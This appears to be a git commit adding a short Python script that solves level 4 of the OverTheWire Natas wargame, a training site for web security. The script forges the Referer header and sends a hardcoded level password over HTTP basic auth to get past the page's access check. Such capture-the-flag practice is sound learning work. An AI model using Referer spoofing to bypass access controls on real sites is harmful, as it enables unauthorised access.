3b4b4051f0361163f124aca3442396d505431919
Oluwayanmife Okunlola <oluwayanmifenokunlola@gmail.com>
2025-12-15 11:37:26 +0100

    Natas python script

---
+++ natas4.py
@@ -0,0 +1,9 @@
+import requests
+from requests.auth import HTTPBasicAuth
+
+url = 'http://natas4.natas.labs.overthewire.org/'
+headers = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}
+auth = HTTPBasicAuth('natas4', 'QryZXc2e0zahULdHrtHxzyYkj59kUxLQ')
+
+response = requests.get(url, headers=headers, auth=auth)
+print(response.text[:2000]) 
